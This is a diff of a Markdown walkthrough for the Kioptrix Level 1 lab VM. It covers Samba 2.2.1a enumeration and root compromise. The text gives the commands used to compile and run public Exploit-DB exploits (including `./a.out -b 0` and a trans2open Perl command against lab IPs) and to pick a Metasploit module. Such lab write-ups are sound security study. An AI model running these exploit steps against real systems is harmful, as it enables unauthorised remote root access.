@@ -62,7 +62,7 @@ By Kioptrix
 * Running `enum4linux 10.0.2.12` quickly gave us a long list of results. We see `KIOPTRIX Wk Sv PrQ Unx NT SNT Samba Server` under the `OS Information` section, with OS version `4.5` running.
 ![](/screenshots/kioptrix-level-1/enum4linuxOsInformation.jpg)
 * **Re-visit/Question**: I read from kongwenbin's write-up that running the command should give us the OS information for the smbclient as well. Notice that ours is left blank as shown above. Crucially, it reveals that the Samba version is `2.2.1a`, and not 4.5 as what we thought!
-* Given this crucial piece of information, the [first Google search result](https://www.exploit-db.com/exploits/10) for `samba 2.2.1a exploit` was able to give me a `root` shell easily - `Remote Code Execution`:
+* Given this crucial piece of information, the [first Google search result](https://www.exploit-db.com/exploits/10) (which is from Exploit-DB) for `samba 2.2.1a exploit` was able to give me a `root` shell easily - `Remote Code Execution`:
 ![](/screenshots/kioptrix-level-1/sambaExploitGoogleSearch.jpg)
 * After downloading and compiling the code (`gcc 10.c`), run `./a.out -b 0 10.0.2.12`:
 ![](/screenshots/kioptrix-level-1/sambaRemoteRootExploit.jpg)
@@ -70,8 +70,8 @@ By Kioptrix
 * Note: Running `exit` seems to be a little buggy for me, i.e. the shell does not terminate immediately.
 
 ### trans2open Overflow (Metasploit) ###
-* The [second Google search](https://www.exploit-db.com/exploits/7) result shows that the Samba version is also susceptible to a `Remote Buffer Overflow`, specifically a trans2open overflow. [A Rapid7 entry](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open) shows that there is a Metasploit module available pertaining to it for our use.
-* According to [a cvedetails page for this exploit](https://www.cvedetails.com/cve/CVE-2003-0201/), the name of the exploit is due to a "buffer overflow in the call_trans2open function in trans2.c".
+* The [second Google search](https://www.exploit-db.com/exploits/7) result (which is also from Exploit-DB) shows that the Samba version is also susceptible to a `Remote Buffer Overflow`, specifically a trans2open overflow. [A Rapid7 entry](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open) shows that there is a Metasploit module available pertaining to it for our use.
+* According to [a cvedetails page for this vulnerability](https://www.cvedetails.com/cve/CVE-2003-0201/), the name of the exploit is due to a "buffer overflow in the call_trans2open function in trans2.c". Accoding to the [SecurityFocus's entry page on this vulnerability](https://www.securityfocus.com/bid/7294/discuss) "The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory. Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process."
 * **Question**: Not exactly sure why the Perl script from the Exploit-DB page does not result in any shell despite running for around 10 minutes. My executed command was `perl 7.pl -t linx86 -H 10.0.2.6 -h 10.0.2.12`.
 * Searching with the keyword `trans2open` after running `msfconsole` gives us 4 results, with each being applicable to only the respective OSes. We will be using the one for `Linux x86` (**where did we get this piece of information? i.e. how do we know we should be using Linux?**)
 ![](/screenshots/kioptrix-level-1/metasploitTrans2openModules.jpg)
